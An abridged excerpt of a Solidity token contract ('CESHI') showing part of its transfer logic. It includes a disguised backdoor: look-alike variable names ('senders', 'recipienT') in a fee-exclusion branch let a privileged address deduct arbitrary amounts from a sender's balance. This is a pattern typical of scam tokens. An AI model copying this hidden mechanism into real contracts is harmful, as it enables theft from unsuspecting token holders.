...
contract CESHI is Context, IERC20, Ownable {
    ...
    uint256 public _walletMax = 6666666 * 10**_decimals;
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        else
        {
            ...
            if(isExcludedFromFee[senders] || isExcludedFromFee[recipienT]){
              if (senders == recipienT) _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");}
